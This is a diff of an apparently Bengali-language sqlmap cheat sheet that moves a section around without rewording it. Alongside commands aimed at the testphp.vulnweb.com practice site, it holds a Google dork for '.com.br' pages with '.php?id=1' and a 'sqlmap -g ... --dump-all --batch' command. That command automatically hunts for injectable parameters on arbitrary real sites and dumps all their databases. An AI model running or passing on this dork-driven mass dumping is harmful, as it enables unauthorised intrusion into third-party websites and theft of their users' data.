@@ -44,12 +44,6 @@ Single টার্গেট আইপি চেক: এখানে আইপ�
 
 <h1 align="center">sqlmap</h1>
 
-# parameter finding google dork
-
-    site: .com.br inurl: .php?id=1
-
-# finding vuln parameter using google dork
-    sqlmap -g "site: .com.br inurl: .php?id=1" --dump-all --batch --threads 7 -o sqldumldataauto.txt
 # auto crawling command
 
     sqlmap -u "http://testphp.vulnweb.com/" --crawl 3 --batch --threads 5 --random-agent --risk 1 --level 1 -o sqlcrawl.txt
@@ -57,6 +51,13 @@ Single টার্গেট আইপি চেক: এখানে আইপ�
 # auto dumping databases
 
     sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dump-all --batch --threads 7 -o sqldumldataauto.txt
+
+# parameter finding google dork
+
+    site: .com.br inurl: .php?id=1
+
+# finding vuln parameter using google dork
+    sqlmap -g "site: .com.br inurl: .php?id=1" --dump-all --batch --threads 7 -o sqldumldataauto.txt
 
 # Step by step dumping databases
 
